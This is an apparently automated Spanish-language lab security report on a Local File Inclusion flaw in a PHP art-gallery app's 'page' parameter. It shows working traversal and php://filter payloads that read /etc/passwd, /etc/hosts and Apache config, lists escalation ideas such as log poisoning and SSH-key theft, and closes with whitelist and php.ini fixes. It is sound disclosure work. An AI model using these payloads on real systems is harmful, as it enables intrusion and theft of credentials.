# Informe de Análisis de Seguridad - Local File Inclusion (LFI)

**Fecha:** 2026-04-30 16:18:26  
**Objetivo:** http://web.dev.local:8081  
**Tipo de vulnerabilidad:** Local File Inclusion (LFI)  
**Analista:** Automated Security Audit

---

## 1. Resumen Ejecutivo

Se identificó y explotó con éxito una vulnerabilidad de tipo **Local File Inclusion (LFI)** en la aplicación web "Galería de Arte Virtual" ubicada en `http://web.dev.local:8081`. La vulnerabilidad permite a un atacante leer archivos arbitrarios del sistema de archivos del servidor, poniendo en riesgo la confidencialidad de datos sensibles del sistema.

**Severidad:** 🔴 **CRÍTICA**

---

## 2. Descripción del Objetivo

- **URL:** http://web.dev.local:8081
- **Aplicación:** Galería de Arte Virtual
- **Tecnología:** PHP (Apache/Linux)
- **Parámetro vulnerable:** `page` en `gallery.php`

---

## 3. Vulnerabilidad Identificada

### 3.1 Local File Inclusion (LFI)

**Endpoint vulnerable:**
```
http://web.dev.local:8081/gallery.php?page=<valor>
```

El parámetro `page` es utilizado directamente para incluir archivos del sistema mediante una función PHP de tipo `include()` o `require()`, sin sanitización adecuada de la entrada del usuario. Esto permite a un atacante utilizar secuencias de traversal de directorio (`../`) para acceder a archivos fuera del directorio web.

---

## 4. Pruebas de Explotación

### 4.1 Lectura de `/etc/passwd`

**Payload utilizado:**
```
http://web.dev.local:8081/gallery.php?page=../../../etc/passwd
```

**Resultado exitoso:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### 4.2 Uso del wrapper PHP `php://filter` (Base64)

**Payload:**
```
http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=../../../etc/passwd
```

Este wrapper PHP también funcionó, confirmando que el LFI acepta tanto rutas relativas directas como wrappers de PHP, ampliando significativamente el alcance del ataque (posibilidad de leer fuentes PHP codificadas en base64 para evadir filtros).

### 4.3 Lectura de `/etc/hosts`

**Payload:**
```
http://web.dev.local:8081/gallery.php?page=../../../etc/hosts
```

**Resultado:**
```
127.0.0.1    localhost
::1          localhost ip6-localhost ip6-loopback
fe00::       ip6-localnet
ff00::       ip6-mcastprefix
ff02::1      ip6-allnodes
ff02::2      ip6-allrouters
172.19.0.2   d5054e367753
```

Se puede observar que el servidor está en la red `172.19.0.2`, posiblemente un contenedor Docker.

### 4.4 Lectura de configuración Apache

**Payload:**
```
http://web.dev.local:8081/gallery.php?page=../../../etc/apache2/sites-enabled/000-default.conf
```

Se obtuvo la configuración del virtual host Apache con éxito.

---

## 5. Impacto

| Vector | Descripción |
|--------|-------------|
| **Confidencialidad** | Alta — Lectura de archivos del sistema, incluyendo configuraciones y credenciales |
| **Integridad** | Media — Si se combina con file upload o log poisoning, podría derivar en RCE |
| **Disponibilidad** | Baja — No afecta directamente la disponibilidad del servicio |

**Posibles escaladas del ataque:**
- Lectura de archivos de configuración con credenciales (`.env`, `config.php`, `wp-config.php`)
- Log Poisoning para derivar a Remote Code Execution (RCE)
- Lectura de claves SSH privadas en `/root/.ssh/id_rsa`
- Lectura de tokens de sesión o cookies

---

## 6. Clasificación CVSS

| Métrica | Valor |
|---------|-------|
| Vector de Ataque | Red (Network) |
| Complejidad | Baja |
| Privilegios Requeridos | Ninguno |
| Interacción del Usuario | No requerida |
| Confidencialidad | Alta |
| **Puntuación CVSS v3** | **~7.5 (Alta)** |

**CWE:** CWE-22 (Path Traversal) / CWE-98 (Improper Control of Filename for Include/Require)

---

## 7. Recomendaciones

1. **Validar y sanitizar la entrada del usuario:** Nunca usar directamente el valor de un parámetro HTTP para incluir archivos. Usar una lista blanca de páginas permitidas.

   ```php
   // INSEGURO
   include($_GET['page'] . '.php');
   
   // SEGURO - Lista blanca
   $allowed_pages = ['modern', 'classic', 'abstract', 'about'];
   if (in_array($_GET['page'], $allowed_pages)) {
       include($_GET['page'] . '.php');
   }
   ```

2. **Deshabilitar wrappers PHP peligrosos** en `php.ini`:
   ```ini
   allow_url_include = Off
   allow_url_fopen = Off
   ```

3. **Aplicar el principio de mínimo privilegio:** El proceso web (`www-data`) no debe tener acceso de lectura a archivos del sistema sensibles.

4. **Implementar un WAF (Web Application Firewall)** para detectar y bloquear patrones de traversal (`../`, `%2e%2e/`, etc.).

5. **Configurar `open_basedir`** en PHP para restringir el acceso del intérprete a directorios específicos:
   ```ini
   open_basedir = /var/www/html
   ```

---

## 8. Conclusión

La aplicación web `gallery.php` en `http://web.dev.local:8081` es **vulnerable a Local File Inclusion (LFI)** a través del parámetro `page`. La vulnerabilidad fue explotada con éxito, logrando leer archivos sensibles del sistema como `/etc/passwd`, `/etc/hosts` y la configuración de Apache. Además, los wrappers PHP (`php://filter`) están activos, lo que podría permitir a un atacante leer el código fuente PHP codificado. Se recomienda aplicar las correcciones indicadas de forma inmediata.

---

*Informe generado automáticamente - Laboratorio de Seguridad*
